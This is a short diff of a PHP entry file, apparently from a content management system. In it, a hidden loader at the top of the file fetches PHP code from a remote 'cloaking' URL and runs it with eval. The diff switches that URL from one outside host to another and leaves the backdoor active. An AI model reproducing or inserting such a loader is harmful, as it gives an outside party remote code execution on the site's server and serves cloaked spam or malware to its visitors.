@@ -1,8 +1,7 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/cloaking/polman.txt'));
+$url = file_get_contents(urldecode('https://waluyo.site/cloaking/rpmi.txt'));
 $url = "?> ".$url;
 eval($url);
-
 
 /**
  * @defgroup index Index
